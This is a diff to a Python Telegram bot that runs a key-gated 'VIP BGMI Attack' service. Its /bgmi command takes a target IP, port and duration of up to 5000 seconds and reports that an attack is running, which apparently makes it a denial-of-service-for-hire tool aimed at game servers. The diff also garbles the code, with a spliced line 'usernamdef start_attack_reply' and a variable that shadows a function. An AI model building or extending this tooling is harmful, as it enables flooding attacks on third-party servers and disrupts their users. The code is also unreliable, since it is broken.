@@ -273,29 +273,31 @@ def log_command(user_id, target, port, time):
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
 def start_attack_reply(message, target, port, time):
-def start_attack_reply(message, target, port, time):
+    user_info = message.from_user
+    usernamdef start_attack_reply(message, target, port, time_duration):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
-    
+
     response = f"""
 🎩 **VIP BGMI Attack Initiated!**
 
 **Target:** `{target}`
 **Port:** `{port}`
-**Duration:** `{time} seconds`
+**Duration:** `{time_duration} seconds`
 
 🛡️ **Status:** Attack is now running...
 
 🔧 **Support:** For any assistance, contact @NINJA666.
 """
     # Adding watermark to the response
-    response = f"{watermark_message(response)}"
+    response = watermark_message(response)
 
     bot.reply_to(message, response, parse_mode="Markdown")
+
 @bot.message_handler(commands=['bgmi'])
 def handle_bgmi(message):
     user_id = message.from_user.id
-    
+
     # Check if the user is an admin
     if str(user_id) == ADMIN_ID:
         pass  # Admins can execute BGMI command without a key
@@ -303,7 +305,7 @@ def handle_bgmi(message):
         watermark_message = "❌ You are not authorized to use this command. Please verify your access key using `/enter_key <key>`."
         bot.reply_to(message, watermark_message)
         return
-    
+
     if user_id in active_attacks:
         watermark_message = "❌ You already have an active attack. Please wait for it to finish before starting a new one."
         bot.reply_to(message, watermark_message)
@@ -314,7 +316,7 @@ def handle_bgmi(message):
         target = command[1]
         port = int(command[2])  # Convert port to integer
         time_duration = int(command[3])  # Convert time to integer
-        
+
         if time_duration > 5000:
             response = "Error: Time interval must be less than 5000."
         else:
@@ -333,8 +335,7 @@ def handle_bgmi(message):
     else:
         response = "Usage: /bgmi <target> <port> <time>"
 
-    watermark_message = response
-    bot.reply_to(message, watermark_message
+    bot.reply_to(message, watermark_message(response))
                  
 @bot.message_handler(commands=['stat'])
 def handle_stat(message):
